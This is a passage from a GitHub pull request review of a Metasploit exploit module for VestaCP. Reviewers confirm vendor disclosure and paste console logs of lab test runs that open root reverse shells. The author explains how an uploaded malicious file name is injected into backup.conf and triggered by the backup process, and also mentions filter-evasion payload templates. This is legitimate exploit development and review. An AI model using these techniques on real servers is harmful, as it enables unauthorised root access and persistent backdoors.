### @acammack-r7 **[acammack-r7](/acammack-r7)** [Mar 19, 2020](#discussion_r395066133)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Command stagers should be able to operate even with these restrictions, were there any issues you noticed?

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @mdisec **[mdisec](/mdisec)** [Mar 19, 2020](#discussion_r395181761)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I haven't noticed specific issue but I choose meterpreter payload delivery via web because of following reasons:

* Meterpreter is lovely ‚ù§Ô∏è I always go for it if it's possible.
* Raw cmd stagers contains lots of special chars , such as < > & " etc etc , which are usually cause a syntax errors during exploitation of these type of vulnerabilities. So I have to must black-listed almost all of them, which means final payload will always be `perl{IFS}-e{IFS}` template no matter what type of cmd stager is being used.
* Specially when you encode python meterpreter stager into the `perl{IFS}-e{IFS}` template, there is no way to keep it shorter then file name length. So that means even if I support multiple payload platform, I have to use web delivery when python payload selected, which brings more and more if-else states in the module. I'm not even mentioning about supporting linux elf binary stagers, which brings even moreeee if-elses to module and bash codes on the server. At some point, I told my self "Meeeh, that's getting complicated :D why don't we just focus python meterpreter"

Sorry, something went wrong.

All reactions

Copy link

Contributor

### @wvu **[wvu](/wvu)** [Apr 10, 2020](#discussion_r406809860)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Yeah, using a library is ideal, but if the vuln is specific enough on restrictions, it's probably best to do custom encoding instead of working around the library. Fewer regressions may be anticipated in this case.

That said, I would make my best effort to make the library work, and I would modify the library if possible, but that may be more regression-prone. I think what you've done is fine in this case, and the module will continue to work into the future.

Sorry, something went wrong.

 üëç
1
 mdisec reacted with thumbs up emoji
 ‚ù§Ô∏è
1
 mdisec reacted with heart emoji

All reactions

* üëç
  1 reaction
* ‚ù§Ô∏è
  1 reaction

[![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&u=562c1b6600d722e45a20f2202dddeb2d6db1f091&v=4)](/bwatters-r7)
[bwatters-r7](/bwatters-r7)
added
the
[easy](/rapid7/metasploit-framework/labels/easy)
label
[Apr 2, 2020](#event-3192680302)

[![@ccondon-r7](https://avatars.githubusercontent.com/u/40408740?s=80&u=a4760e9ee13db32bc35abcbae31ec34776f34bf7&v=4)](/ccondon-r7)

Copy link

Contributor

### **[ccondon-r7](/ccondon-r7)** commented [Apr 9, 2020](#issuecomment-611633539) ‚Ä¢ edited Loading

| Hey @mmetince, we're going to take a look at this in a bit, but question for you: Has the vuln been disclosed to the vendor here? And if it hasn't been, it needs to be. If you don't want to do that, [@todb-r7](https://github.com/todb-r7) might be able to help out. |
| --- |

 üëç
1
 mdisec reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=80&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)

Copy link

Contributor

Author

### **[mdisec](/mdisec)** commented [Apr 10, 2020](#issuecomment-611909335)

| Hey [@ccondon-r7](https://github.com/ccondon-r7) , vulnerability has been disclosed to the vendor. Fix is merged to the master with following commit [outroll/vesta@a571254](https://github.com/outroll/vesta/commit/a5712542d7315f45abf6df275744889437393c30) ! I also reported this vulnerability to the different projects that are use vesta-cp as a base project. |
| --- |

 ‚ù§Ô∏è
4
 wvu, gwillcox-r7, mirhatx, and Aporlorxl23 reacted with heart emoji

All reactions

* ‚ù§Ô∏è
  4 reactions

Sorry, something went wrong.

[![@ccondon-r7](https://avatars.githubusercontent.com/u/40408740?s=80&u=a4760e9ee13db32bc35abcbae31ec34776f34bf7&v=4)](/ccondon-r7)

Copy link

Contributor

### **[ccondon-r7](/ccondon-r7)** commented [Apr 10, 2020](#issuecomment-612029346)

| Awesome, @mmetince, thanks for confirming. You're the best! Nice work :) |
| --- |

 ‚ù§Ô∏è
5
 mdisec, wvu, gwillcox-r7, mirhatx, and Aporlorxl23 reacted with heart emoji

All reactions

* ‚ù§Ô∏è
  5 reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
self-assigned this
[Apr 10, 2020](#event-3222371981)

[![wvu](https://avatars.githubusercontent.com/u/4551878?s=60&v=4)](/wvu)

**[wvu](/wvu)**
reviewed
[Apr 10, 2020](#pullrequestreview-391565949)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13094/files)

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)

Show resolved

Hide resolved

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
reviewed
[Apr 10, 2020](#pullrequestreview-391666048)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13094/files)

[documentation/modules/exploit/linux/http/vestacp\_exec.md](/rapid7/metasploit-framework/pull/13094/files#diff-03ca89d652d82c4c4d8e2a0f1685ee8b2620955000bc0816306e659633e51edd)
Outdated

Show resolved

Hide resolved

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
suggested changes
[Apr 10, 2020](#pullrequestreview-391666561)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13094/files)

Copy link

Contributor

### @gwillcox-r7 **[gwillcox-r7](/gwillcox-r7)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

There are a few areas in this that still need fixes which I have marked in the review. Rest of it looks like mostly just grammatical and spelling errors which I will fix after you've fixed up these issues.

Sorry, something went wrong.

All reactions

[documentation/modules/exploit/linux/http/vestacp\_exec.md](/rapid7/metasploit-framework/pull/13094/files#diff-03ca89d652d82c4c4d8e2a0f1685ee8b2620955000bc0816306e659633e51edd)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/linux/http/vestacp\_exec.md](/rapid7/metasploit-framework/pull/13094/files#diff-03ca89d652d82c4c4d8e2a0f1685ee8b2620955000bc0816306e659633e51edd)
Outdated

Show resolved

Hide resolved

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)
Outdated

Show resolved

Hide resolved

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)
Outdated

Show resolved

Hide resolved

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)
Outdated

Show resolved

Hide resolved

4 hidden conversations

Load more‚Ä¶

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)
Outdated

Show resolved

Hide resolved

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)
Outdated

Show resolved

Hide resolved

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)
Outdated

Show resolved

Hide resolved

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)
Outdated

Show resolved

Hide resolved

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)
Outdated

Show resolved

Hide resolved

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Apr 11, 2020](#issuecomment-612334682) ‚Ä¢ edited Loading

| Also @mmetince tried your exploit using the install instructions at <http://vestacp.com/install/> on Ubuntu 18.03 LTS. Seems the exploit does work though, but had to run it twice and then got a root shell instantly; guess the listener was timing out or something cause first try wasn't reliable and I lost the shell.  ``` msf5 > use exploit/linux/http/vestacp_exec  msf5 exploit(linux/http/vestacp_exec) > set RHOST 172.16.139.129 RHOST => 172.16.139.129 msf5 exploit(linux/http/vestacp_exec) > set LHOST 172.16.139.1 LHOST => 172.16.139.1 msf5 exploit(linux/http/vestacp_exec) > set SRVHOST 172.16.139.1 SRVHOST => 172.16.139.1 msf5 exploit(linux/http/vestacp_exec) > set USERNAME tester USERNAME => tester msf5 exploit(linux/http/vestacp_exec) > set PASSWORD testing PASSWORD => testing msf5 exploit(linux/http/vestacp_exec) > show options  Module options (exploit/linux/http/vestacp_exec):     Name       Current Setting  Required  Description    ----       ---------------  --------  -----------    PASSWORD   testing          yes       The password to login with    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]    RHOSTS     172.16.139.129   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT      8083             yes       The target port (TCP)    SRVHOST    172.16.139.1     yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0    SRVPORT    8080             yes       The local port to listen on.    SSL        true             no        Negotiate SSL/TLS for outgoing connections    SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)    TARGETURI  /                yes       The URI of the vulnerable instance    URIPATH                     no        The URI to use for this exploit (default is random)    USERNAME   tester           yes       The username to login as    VHOST                       no        HTTP server virtual host   Payload options (python/meterpreter/reverse_tcp):     Name   Current Setting  Required  Description    ----   ---------------  --------  -----------    LHOST  172.16.139.1     yes       The listen address (an interface may be specified)    LPORT  4444             yes       The listen port   Exploit target:     Id  Name    --  ----    0   Automatic   msf5 exploit(linux/http/vestacp_exec) > exploit [*] Exploit running as background job 0. [*] Exploit completed, but no session was created.  msf5 exploit(linux/http/vestacp_exec) > [*] Started reverse TCP handler on 172.16.139.1:4444  [*] 172.16.139.129:8083 - Using URL: http://172.16.139.1:8080/5EgtLfy5uO17X [*] 172.16.139.129:8083 - Second payload download URI is http://172.16.139.1:8080/5EgtLfy5uO17X [+] 172.16.139.129:21 - Successfully authenticated to the FTP service [+] 172.16.139.129:21 - Successfully uploaded the payload as a file name [*] 172.16.139.129:8083 - Retrieving cookie and csrf token values [+] 172.16.139.129:8083 - Cookie and CSRF token values successfully retrieved [*] 172.16.139.129:8083 - Authenticating to HTTP Service with given credentials [+] 172.16.139.129:8083 - Successfully authenticated to the HTTP Service [+] 172.16.139.129:8083 - Scheduled backup has ben started. Exploitation may take up to 5 minutes. [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [+] 172.16.139.129:8083 - First stage is executed ! Sending 2nd stage of the payload [*] Sending stage (53755 bytes) to 172.16.139.129 [*] Meterpreter session 1 opened (172.16.139.1:4444 -> 172.16.139.129:57612) at 2020-04-11 00:10:17 -0500 [-] 172.16.139.129:8083 - Exploit aborted due to failure: unknown: Something went wrong. Maybe session timed out ? [*] 172.16.139.129:8083 - Server stopped.  msf5 exploit(linux/http/vestacp_exec) > sessions -i 1 [*] Starting interaction with 1...  meterpreter > getuid [-] Unknown command: getuid. meterpreter > whoami [-] Unknown command: whoami. meterpreter > ls [-] Unknown command: ls. meterpreter > shell [-] Unknown command: shell. meterpreter > guid [+] Session GUID: 00000000-0000-0000-0000-000000000000 meterpreter >  [*] 172.16.139.129 - Meterpreter session 1 closed.  Reason: Died  msf5 exploit(linux/http/vestacp_exec) > exploit [*] Exploit running as background job 1. [*] Exploit completed, but no session was created.  [*] Started reverse TCP handler on 172.16.139.1:4444  msf5 exploit(linux/http/vestacp_exec) > [*] 172.16.139.129:8083 - Using URL: http://172.16.139.1:8080/k9CjxSf3qjf [*] 172.16.139.129:8083 - Second payload download URI is http://172.16.139.1:8080/k9CjxSf3qjf [+] 172.16.139.129:21 - Successfully authenticated to the FTP service [+] 172.16.139.129:21 - Successfully uploaded the payload as a file name [*] 172.16.139.129:8083 - Retrieving cookie and csrf token values [+] 172.16.139.129:8083 - Cookie and CSRF token values successfully retrieved [*] 172.16.139.129:8083 - Authenticating to HTTP Service with given credentials [+] 172.16.139.129:8083 - Successfully authenticated to the HTTP Service [+] 172.16.139.129:8083 - Scheduled backup has ben started. Exploitation may take up to 5 minutes. [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] Sending stage (53755 bytes) to 172.16.139.129 [*] Meterpreter session 2 opened (172.16.139.1:4444 -> 172.16.139.129:57652) at 2020-04-11 00:21:42 -0500  msf5 exploit(linux/http/vestacp_exec) > sessions -i 2 [*] Starting interaction with 2...  meterpreter > getuid Server username: root meterpreter > shell Process 63749 created. Channel 1 created. /bin/sh: 0: can't access tty; job control turned off # whoami root # id uid=0(root) gid=0(root) groups=0(root)  ```  And then I did one more test after killing all jobs to double check:  ``` msf5 exploit(linux/http/vestacp_exec) > exploit [*] Exploit running as background job 3. [*] Exploit completed, but no session was created.  [*] Started reverse TCP handler on 172.16.139.1:4444  msf5 exploit(linux/http/vestacp_exec) > [*] 172.16.139.129:8083 - Using URL: http://172.16.139.1:8080/wW7t9zd6 [*] 172.16.139.129:8083 - Second payload download URI is http://172.16.139.1:8080/wW7t9zd6 [+] 172.16.139.129:21 - Successfully authenticated to the FTP service [+] 172.16.139.129:21 - Successfully uploaded the payload as a file name [*] 172.16.139.129:8083 - Retrieving cookie and csrf token values [+] 172.16.139.129:8083 - Cookie and CSRF token values successfully retrieved [*] 172.16.139.129:8083 - Authenticating to HTTP Service with given credentials [+] 172.16.139.129:8083 - Successfully authenticated to the HTTP Service [+] 172.16.139.129:8083 - Scheduled backup has ben started. Exploitation may take up to 5 minutes. [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 172.16.139.129:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [+] 172.16.139.129:8083 - First stage is executed ! Sending 2nd stage of the payload [*] Sending stage (53755 bytes) to 172.16.139.129 [*] Meterpreter session 4 opened (172.16.139.1:4444 -> 172.16.139.129:57808) at 2020-04-11 00:30:04 -0500  msf5 exploit(linux/http/vestacp_exec) > sessions -i 4 [*] Starting interaction with 4...  meterpreter > getuid Server username: root meterpreter > shell Process 66042 created. Channel 1 created. /bin/sh: 0: can't access tty; job control turned off # ge [-] 172.16.139.129:8083 - Exploit aborted due to failure: unknown: Something went wrong. Maybe session timed out ? [*] 172.16.139.129:8083 - Server stopped. ^R whoami root #   ```  So looks like it is working but I'd like to see that error about the session timing out resolved somehow as it seems to be appearing all the time even when the exploit completes successfully. I'll also retest this again when all of the fixes have been applied to ensure that thing still work as expected. |
| --- |

 üëç
1
 wvu reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

 [mdisec](/mdisec)
added 3 commits
[April 11, 2020 12:22](#commits-pushed-7c2f65d)

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Adding vestacp exec](/rapid7/metasploit-framework/pull/13094/commits/7c2f65da3698f3b6fb9d8a9e12e4281ad80c5877 "Adding vestacp exec

Signed-off-by: Mehmet ƒ∞nce <mehmet@mehmetince.net>")`
 ‚Ä¶

`[7c2f65d](/rapid7/metasploit-framework/pull/13094/commits/7c2f65da3698f3b6fb9d8a9e12e4281ad80c5877)`

```
Signed-off-by: Mehmet ƒ∞nce <mehmet@mehmetince.net>
```

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Adding documentation and module description](/rapid7/metasploit-framework/pull/13094/commits/5d04c2b4a55abf49fd29df78d8fb6b0d4258844d "Adding documentation and module description

Signed-off-by: Mehmet ƒ∞nce <mehmet@mehmetince.net>")`
 ‚Ä¶

`[5d04c2b](/rapid7/metasploit-framework/pull/13094/commits/5d04c2b4a55abf49fd29df78d8fb6b0d4258844d)`

```
Signed-off-by: Mehmet ƒ∞nce <mehmet@mehmetince.net>
```

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Adding CVE number](/rapid7/metasploit-framework/pull/13094/commits/eb7d2f821dc14fa9938c1e53dde9d4406a68bad2 "Adding CVE number

Signed-off-by: Mehmet ƒ∞nce <mehmet@mehmetince.net>")`
 ‚Ä¶

`[eb7d2f8](/rapid7/metasploit-framework/pull/13094/commits/eb7d2f821dc14fa9938c1e53dde9d4406a68bad2)`

```
Signed-off-by: Mehmet ƒ∞nce <mehmet@mehmetince.net>
```

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=80&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)

Copy link

Contributor

Author

### **[mdisec](/mdisec)** commented [Apr 11, 2020](#issuecomment-612400169)

| [@gwillcox-r7](https://github.com/gwillcox-r7) Thank you very much for your comprehensive review ! ü§òüèª  `Seems the exploit does work though, but had to run it twice and then got a root shell instantly`  The reason why you've got the instant root shell on your second **run** is all about nature of the vulnerability.  One of the most important thing about this exploit module is that, we are injection our payload into the `cat /usr/local/vesta/data/users/[USERNAME]/backup.conf` file by using v-backup-user. That files contains all the information about backup of the user. When the backup is done, we are triggering the payload.  So the logic is like a follow.  1 - Put an empty file into the user home folder with a malicious file name. 2 - Trigger the backup, which will manipulate the backup.conf ! 3 - Visit the backup list URL, if you are seeing `An existing backup is already running.` that means backup is still in progress. We must wait until it's done. 4 - Visit the backup list URL again and agin. If the backup is done, that means we are not seeing `An existing backup is already running.`, which means we triggered the payload !  When you second run the module, it triggers another backup process. In that case, backup.conf file content already contains a payload from the first attempt ! On your first attempt to check status of the backup via backup list URL, you are triggering payload that is already placed on the first attempt :) |
| --- |

All reactions

Sorry, something went wrong.

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Fixed reviews suggestions](/rapid7/metasploit-framework/pull/13094/commits/d906c3dc77f82660f2343d4279c528f080672348 "Fixed reviews suggestions")`

`[d906c3d](/rapid7/metasploit-framework/pull/13094/commits/d906c3dc77f82660f2343d4279c528f080672348)`

 [![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)
[mdisec](/mdisec)
[force-pushed](/rapid7/metasploit-framework/compare/3b03112aa70c60e2aa0b99fa400c2a1e4a9e7439..d906c3dc77f82660f2343d4279c528f080672348)
the
vestacp\_exec

branch
from
[`3b03112`](/rapid7/metasploit-framework/commit/3b03112aa70c60e2aa0b99fa400c2a1e4a9e7439) to
[`d906c3d`](/rapid7/metasploit-framework/commit/d906c3dc77f82660f2343d4279c528f080672348)  [Compare](/rapid7/metasploit-framework/compare/3b03112aa70c60e2aa0b99fa400c2a1e4a9e7439..d906c3dc77f82660f2343d4279c528f080672348)
[April 11, 2020 11:44](#event-3223975161)

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=80&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)

Copy link

Contributor

Author

### **[mdisec](/mdisec)** commented [Apr 11, 2020](#issuecomment-612403935)

| Here is the output of final version.  ``` msf5 exploit(linux/http/vestacp_exec) > run [*] Exploit running as background job 32. [*] Exploit completed, but no session was created.  [*] Started reverse TCP handler on 192.168.74.1:4444  [*] 192.168.74.218:8083 - Using URL: http://192.168.74.1:8081/poSeL7s msf5 exploit(linux/http/vestacp_exec) > [*] 192.168.74.218:8083 - Second payload download URI is http://192.168.74.1:8081/poSeL7s [+] 192.168.74.218:21 - Successfully authenticated to the FTP service [+] 192.168.74.218:21 - The file with the payload in the file name has been successfully uploaded. [*] 192.168.74.218:8083 - Retrieving cookie and csrf token values [+] 192.168.74.218:8083 - Cookie and CSRF token values successfully retrieved [*] 192.168.74.218:8083 - Authenticating to HTTP Service with given credentials [+] 192.168.74.218:8083 - Successfully authenticated to the HTTP Service [*] 192.168.74.218:8083 - Starting scheduled backup. Exploitation may take up to 5 minutes. [+] 192.168.74.218:8083 - Scheduled backup has been started !  [*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [+] 192.168.74.218:8083 - First stage is executed ! Sending 2nd stage of the payload [*] Sending stage (53755 bytes) to 192.168.74.218 [*] Meterpreter session 8 opened (192.168.74.1:4444 -> 192.168.74.218:58790) at 2020-04-11 14:35:23 +0300  msf5 exploit(linux/http/vestacp_exec) > sessions -i 8  [*] Starting interaction with 8...  meterpreter > shell Process 42978 created. Channel 1 created. /bin/sh: 0: can't access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) meterpreter > shell [+] 192.168.74.218:8083 - It seems scheduled backup is done ..! Triggering the payload <3  #   ``` |
| --- |

 üëç
3
 gwillcox-r7, mirhatx, and Aporlorxl23 reacted with thumbs up emoji

All reactions

* üëç
  3 reactions

Sorry, something went wrong.

 [![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)
[mdisec](/mdisec)
requested a review
from [gwillcox-r7](/gwillcox-r7)
[April 11, 2020 11:58](#event-3223986008)

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
suggested changes
[Apr 11, 2020](#pullrequestreview-391788533)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13094/files/d906c3dc77f82660f2343d4279c528f080672348)

Copy link

Contributor

### @gwillcox-r7 **[gwillcox-r7](/gwillcox-r7)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

@mmetince Looking a lot better, still some areas to fix up. Sorry for earlier deleted comment, I made a comment initially and then deleted it and moved it into this full review instead. Main issues were the lack of a `check` command at the moment and the fact that you didn't update the listings within the documentation. Rest of it is mostly edits for additional clarity in certain areas.

Let me know if you have any questions or concerns!

Sorry, something went wrong.

All reactions

[documentation/modules/exploit/linux/http/vestacp\_exec.md](/rapid7/metasploit-framework/pull/13094/files/d906c3dc77f82660f2343d4279c528f080672348#diff-03ca89d652d82c4c4d8e2a0f1685ee8b2620955000bc0816306e659633e51edd)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/linux/http/vestacp\_exec.md](/rapid7/metasploit-framework/pull/13094/files/d906c3dc77f82660f2343d4279c528f080672348#diff-03ca89d652d82c4c4d8e2a0f1685ee8b2620955000bc0816306e659633e51edd)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/linux/http/vestacp\_exec.md](/rapid7/metasploit-framework/pull/13094/files/d906c3dc77f82660f2343d4279c528f080672348#diff-03ca89d652d82c4c4d8e2a0f1685ee8b2620955000bc0816306e659633e51edd)

Show resolved

Hide resolved

[documentation/modules/exploit/linux/http/vestacp\_exec.md](/rapid7/metasploit-framework/pull/13094/files/d906c3dc77f82660f2343d4279c528f080672348#diff-03ca89d652d82c4c4d8e2a0f1685ee8b2620955000bc0816306e659633e51edd)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/linux/http/vestacp\_exec.md](/rapid7/metasploit-framework/pull/13094/files/d906c3dc77f82660f2343d4279c528f080672348#diff-03ca89d652d82c4c4d8e2a0f1685ee8b2620955000bc0816306e659633e51edd)
Outdated

Show resolved

Hide resolved

2 hidden conversations

Load more‚Ä¶

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files/d906c3dc77f82660f2343d4279c528f080672348#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)
Outdated

Show resolved

Hide resolved

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files/d906c3dc77f82660f2343d4279c528f080672348#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)
Outdated

Show resolved

Hide resolved

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files/d906c3dc77f82660f2343d4279c528f080672348#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)
Outdated

Show resolved

Hide resolved

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files/d906c3dc77f82660f2343d4279c528f080672348#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)
Outdated

Show resolved

Hide resolved

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files/d906c3dc77f82660f2343d4279c528f080672348#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)

Show resolved

Hide resolved

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Apr 11, 2020](#issuecomment-612520052) ‚Ä¢ edited Loading

| Also @mmetince I didn't mention this before but given that this module alters a config file, I would like to ensure that there is additional documentation that reflects this.  Can we add the following in (ratings taken from [https://github.com/rapid7/metasploit-framework/wiki/Definition-of-Module-Reliability,-Side-Effects,-and-Stability](https://github.com/rapid7/metasploit-framework/wiki/Definition-of-Module-Reliability%2C-Side-Effects%2C-and-Stability) )  ```       'Notes'          =>         {           'Stability'   => [ CRASH_SAFE, ],           'Reliability' => [ FIRST_ATTEMPT_FAIL, ],           'SideEffects' => [ IOC_IN_LOGS, CONFIG_CHANGES, ],         },  ```  The reason for me adding IOC\_IN\_LOGS is cause if I open up `/usr/local/vesta/log/backup.log` there are clear copies of the commands you are executing in the logs which could indicate potential compromise.  [Screen Shot 2020-04-11 at 4 43 44 PM](https://user-images.githubusercontent.com/63261883/79055568-a0125400-7c13-11ea-8478-b8e63f7e5fe1.png)  For a good reference of where these should be placed, see   [metasploit-framework/modules/exploits/unix/webapp/wp\_infinitewp\_auth\_bypass.rb](https://github.com/rapid7/metasploit-framework/blob/5698f6e51fa8227321d3afe4666fd5a9073ce793/modules/exploits/unix/webapp/wp_infinitewp_auth_bypass.rb#L49)  Line 49 in [5698f6e](/rapid7/metasploit-framework/commit/5698f6e51fa8227321d3afe4666fd5a9073ce793)   |  | 'Notes' => { | | --- | --- |      On a similar note I'd also be interested if there is any way your exploit could clean up after itself as right now it seems that once one runs the exploit, every subsequent backup attempt will try connect back to the attacker's machine. This might be great for persistence but if someone is in a pentest, this will be an absolute 